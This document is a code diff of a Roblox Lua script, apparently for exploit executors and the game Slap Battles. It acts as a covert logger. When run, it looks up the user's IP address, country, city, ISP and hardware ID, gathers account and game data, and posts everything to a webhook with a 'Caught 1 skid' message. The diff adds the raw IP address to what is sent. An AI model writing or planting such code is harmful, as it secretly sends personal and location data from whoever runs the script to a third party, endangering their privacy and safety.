@@ -3,44 +3,26 @@ local HttpService = game:GetService("HttpService")
 function GetIPInfo()
     local api = HttpService:JSONDecode(game:HttpGet("https://ipwho.is/"))
     return {
+        ip = api.ip or "Unknown IP",
         country = api.country or "Unknown Country",
         countryCode = api.country_code or "N/A",
         flagEmoji = api.flag.emoji or "",
         region = api.region or "Unknown Region",
         city = api.city or "Unknown City",
-        organization = api.connection.org or "Unknown Organization",
         continent = api.continent or "Unknown Continent",
+        organization = api.connection.org or "Unknown Organization",
         isp = api.connection.isp or "Unknown ISP",
         asn = api.connection.asn or "Unknown ASN",
         domain = api.connection.domain or "Unknown Domain"
     }
 end
 
-function SendMessage(url, message)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local data = {
-        ["content"] = message
-    }
-    local body = HttpService:JSONEncode(data)
-    local response = request({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end
-
 function SendMessageEMBED(url, embed)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local data = {
-        ["embeds"] = {embed}
-    }
+    local headers = { ["Content-Type"] = "application/json" }
+    local data = { ["embeds"] = { embed } }
     local body = HttpService:JSONEncode(data)
-    local response = request({
+
+    request({
         Url = url,
         Method = "POST",
         Headers = headers,
@@ -55,97 +37,89 @@ local displayName = player.DisplayName
 local username = player.Name
 local userId = player.UserId
 local accountAge = player.AccountAge
+local accountCreationDate = os.date("%d/%m/%Y", os.time() - (accountAge * 86400))
+local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
 
-local platform = game:GetService("UserInputService").TouchEnabled and "Mobile" or "PC"
-
+local platform = game:GetService("UserInputService").TouchEnabled and "📱 Mobile" or "💻 PC"
+local executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-local slaps = 0
-if player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Slaps") then
-    slaps = player.leaderstats.Slaps.Value
-end
-
-local glove = "Unknown"
-if player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove") then
-    glove = player.leaderstats.Glove.Value
-end
-
-local nullShards = 0
-if game.ReplicatedStorage:FindFirstChild("PlayerData") and 
-   game.ReplicatedStorage.PlayerData:FindFirstChild(player.Name) and 
-   game.ReplicatedStorage.PlayerData[player.Name]:FindFirstChild("NullShards") then
-    nullShards = game.ReplicatedStorage.PlayerData[player.Name].NullShards.Value
-end
-
-local tournamentWins = 0
-if game.ReplicatedStorage:FindFirstChild("PlayerData") and 
-   game.ReplicatedStorage.PlayerData:FindFirstChild(player.Name) and 
-   game.ReplicatedStorage.PlayerData[player.Name]:FindFirstChild("TournamentWins") then
-    tournamentWins = game.ReplicatedStorage.PlayerData[player.Name].TournamentWins.Value
-end
-
-local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+local slaps = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Slaps") and player.leaderstats.Slaps.Value or 0
+local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove") and player.leaderstats.Glove.Value or "Unknown"
+local nullShards = game.ReplicatedStorage:FindFirstChild("PlayerData") and game.ReplicatedStorage.PlayerData:FindFirstChild(player.Name) and game.ReplicatedStorage.PlayerData[player.Name]:FindFirstChild("NullShards") and game.ReplicatedStorage.PlayerData[player.Name].NullShards.Value or 0
+local tournamentWins = game.ReplicatedStorage:FindFirstChild("PlayerData") and game.ReplicatedStorage.PlayerData:FindFirstChild(player.Name) and game.ReplicatedStorage.PlayerData[player.Name]:FindFirstChild("TournamentWins") and game.ReplicatedStorage.PlayerData[player.Name].TournamentWins.Value or 0
 
 local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 local placeId = game.PlaceId
 local jobId = game.JobId
 local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. placeId .. "&launchData=" .. jobId
-
 local serverPlayers = #game.Players:GetPlayers() .. " / " .. game.Players.MaxPlayers
 
-local executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
+local scriptTime = os.date("%H:%M:%S - %d/%m/%Y", os.time())
 
-local embeds = {
-    {
-        ["title"] = "Scripts Logger",
-        ["color"] = 65280,
-        ["description"] = 
-            "**Script detected:**  `" .. getgenv().customScriptText .. "`"
-    },
-    {
-        ["title"] = "Information",
-        ["color"] = 16711680,
-        ["description"] = 
-            "**DisplayName:** " .. displayName .. "\n" ..
-            "**Username:** " .. username .. "\n" ..
-            "**User ID:** " .. tostring(userId) .. "\n" ..
-            "**Account Age:** " .. accountAge .. " days\n" ..
-            "**Platform:** " .. platform .. "\n" ..
-            "**Ping:** " .. ping .. "ms\n" ..
-            "**HWID:** `" .. hwid .. "`\n" ..
-            "**Country:** " .. ipInfo.flagEmoji .. " " .. ipInfo.country .. " (" .. ipInfo.countryCode .. ")\n" ..
-            "**Region:** " .. ipInfo.region .. "\n" ..
-            "**City:** " .. ipInfo.city .. "\n" ..
-            "**Continent:** " .. ipInfo.continent .. "\n" ..
-            "**Organization:** " .. ipInfo.organization .. "\n" ..
-            "**ISP:** " .. ipInfo.isp .. "\n" ..
-            "**ASN:** " .. ipInfo.asn .. "\n" ..
-            "**Domain:** " .. ipInfo.domain
-    },
-    {
-        ["title"] = "Slap Battles Data",
-        ["color"] = 65280,
-        ["description"] = 
-            "**Slaps Count:** `" .. slaps .. "`\n" ..
-            "**Glove Equipping:** `" .. glove .. "`\n" ..
-            "**Null Shards:** `" .. nullShards .. "`\n" ..
-            "**Tournament Wins:** `" .. tournamentWins .. "`"
-    },
-    {
-        ["title"] = "More",
-        ["color"] = 255,
-        ["description"] = 
-            "**Executor:** `" .. executor .. "`\n" ..
-            "**Game Name:** `" .. gameName .. "`\n" ..
-            "**Place ID:** `" .. placeId .. "`\n" ..
-            "**Job ID:** `" .. jobId .. "`\n" ..
-            "**Server Players:** `" .. serverPlayers .. "`\n" ..
-            "**Mobile Join:** [Click Here](" .. mobileJoinLink .. ")"
+local ipInfo = GetIPInfo()
+
+local messageText = "Caught 1 skid: " .. username .. " (" .. userId .. ")"
+local headers = { ["Content-Type"] = "application/json" }
+local messageBody = HttpService:JSONEncode({ content = messageText })
+
+request({
+    Url = webhookURL,
+    Method = "POST",
+    Headers = headers,
+    Body = messageBody
+})
+
+local embed = {
+    ["title"] = "🔔 Notification Script",
+    ["color"] = 65280,
+    ["fields"] = {
+        {
+            ["name"] = "◆━━ 📜 Script Information━━◆",
+            ["value"] = "📝 **Script detected:** `" .. getgenv().customScriptText .. "`\n" ..
+                        "⏳ **Script Time:** `" .. scriptTime .. "`",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "◆━━ 👤 User Information━━◆",
+            ["value"] = "🏷 **Display Name:** " .. displayName .. "\n" ..
+                        "🏷 **Username:** " .. username .. "\n" ..
+                        "🆔 **User ID:** " .. tostring(userId) .. "\n" ..
+                        "📅 **Account Age:** " .. accountAge .. " days\n" ..
+                        "📆 **Account Creation Date:** " .. accountCreationDate .. "\n" ..
+                        "🔍 **View Profile:** [Click Here](" .. profileLink .. ")\n" ..
+                        "🖥️ **Platform:** " .. platform .. "\n" ..
+                        "🔷️ **Executor:** `" .. executor .. "`\n" ..
+                        "📱 **HWID:** `" .. hwid .. "`\n" ..
+                        "📍 **IP Address:** `" .. ipInfo.ip .. "`\n" ..
+                        "🏳️ **Country:** " .. ipInfo.flagEmoji .. " " .. ipInfo.country .. " (" .. ipInfo.countryCode .. ")\n" ..
+                        "📍 **Region:** " .. ipInfo.region .. "\n" ..
+                        "🏙️ **City:** " .. ipInfo.city .. "\n" ..
+                        "🗺️ **Continent:** " .. ipInfo.continent .. "\n" ..
+                        "🏢 **Organization:** " .. ipInfo.organization .. "\n" ..
+                        "🌐 **ISP:** " .. ipInfo.isp .. "\n" ..
+                        "🔢 **ASN:** " .. ipInfo.asn .. "\n" ..
+                        "🏠 **Domain:** " .. ipInfo.domain,
+            ["inline"] = false
+        },
+        {
+            ["name"] = "◆━━ 👋 Slap Battles Data━━◆",
+            ["value"] = "🖐 **Slaps:** `" .. slaps .. "`\n" ..
+                        "**Glove Equipping:** `" .. glove .. "`\n" ..
+                        "**Null Shards:** `" .. nullShards .. "`\n" ..
+                        "🏆 **Tournament Wins:** `" .. tournamentWins .. "`",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "◆━━ 🎮 Game Information━━◆",
+            ["value"] = "**Game Name:** `" .. gameName .. "`\n" ..
+                        "🆔 **Place ID:** `" .. placeId .. "`\n" ..
+                        "🔑 **Job ID:** `" .. jobId .. "`\n" ..
+                        "👥 **Server Players:** `" .. serverPlayers .. "`\n" ..
+                        "📲 **Mobile Join:** [Click Here](" .. mobileJoinLink .. ")",
+            ["inline"] = false
+        }
     }
 }
 
-SendMessage(webhookURL, "SKID DETECTION: " .. username)
-
-for _, embed in pairs(embeds) do
-    SendMessageEMBED(webhookURL, embed)
-end
+SendMessageEMBED(webhookURL, embed)
